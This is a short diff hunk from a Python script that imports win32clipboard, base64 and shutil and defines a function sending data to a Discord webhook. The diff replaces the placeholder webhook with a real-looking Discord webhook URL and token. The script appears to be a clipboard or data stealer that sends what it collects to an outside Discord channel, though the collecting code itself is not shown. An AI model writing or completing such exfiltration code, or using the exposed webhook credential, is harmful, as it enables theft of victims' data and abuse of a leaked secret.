@@ -8,7 +8,7 @@ import win32clipboard  # Only works on Windows
 import base64
 import shutil
 
-WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"  # Replace with your Discord webhook URL
+WEBHOOK_URL = "https://discord.com/api/webhooks/1305485793971802166/n2d_kJ0Kosfoq6mttAz-Sr0I6_3xwlj0X1KTHFF9nDH8-0REHApjNnvng2xcugBZxlOd"  # Replace with your Discord webhook URL
 
 # Function to send data to the Discord webhook
 def send_to_discord(message):
